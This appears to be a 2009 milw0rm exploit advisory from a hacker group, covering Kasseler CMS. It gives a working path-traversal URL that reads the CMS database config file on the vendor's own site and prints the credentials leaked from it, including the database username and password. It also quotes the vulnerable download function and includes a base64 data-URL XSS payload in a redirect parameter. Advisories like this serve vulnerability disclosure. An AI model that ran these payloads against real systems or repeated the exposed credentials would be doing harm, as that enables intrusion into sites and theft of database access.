@@ -1,0 +1,57 @@
+#X      X 
+# X    X       A      K  KK  NN    N  EEEEEE  TTTTTTTT
+#  X  X       A A     K K    N N   N  E          TT  
+#   XX       AAAAA    KK     N  N  N  EEE        TT
+#  X  X     A     A   K K    N   N N  E          TT
+# X    X   A       A  K  KK  N    NN  EEEEEE     TT
+#X      X 
+
+Author: S(r1pt - xaknet.ru
+GreetZ to all users xaknet.ru, especial: baltazar, Saint, X1mer@, Trash, Ic3, G1yuk, NEXGEN, ErrNick, deface and other ..
+
+###
+Kasseler-Cms (Reafile/XSS) Multiple Remote Vulnerabilities
+Site author: kasseler-cms.net
+###
+
+Readfile:
+http://www.kasseler-cms.net/engine.php?do=download&file=../includes/config/configdb.php :
+<?php
+/**********************************************/
+/* Kasseler CMS: Content Management System    */
+/**********************************************/
+/*                                            */
+/* Copyright (c)2007-2009 by Igor Ognichenko  */
+/* http://www.kasseler-cms.net/               */
+/*                                            */
+/**********************************************/
+
+if (!defined('FUNC_FILE')) die('Access is limited');
+
+$database = array(
+    'host'                => 'localhost',
+    'user'                => 'kasseler_robin',
+    'password'            => 'cs010488oia',
+    'name'                => 'kasseler_cms',
+    'prefix'              => 'kasseler',
+    'type'                => 'mysql',
+    'charset'             => 'cp1251',
+    'cache'               => '',
+    'sql_cache_clear'     => 'INSERT,UPDATE,DELETE',
+    'no_cache_tables'     => 'sessions'
+);
+?>
+
+vulnerability in engine.php:
+function download(){
+global $config;      
+    require_once "includes/class/download.php";
+    $file = "uploads/".$_GET['file']; #here =)
+    $download = new file_download($file, 0, 1024);
+    $download->download();
+}
+
+AND XSS bonus:
+http://www.kasseler-cms.net/engine.php?do=redirect&url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnRmluZWQgYnkgUyhyMXB0LCDQsNCz0LAuJyk7PC9zY3JpcHQ+ 
+
+# milw0rm.com [2009-06-22]
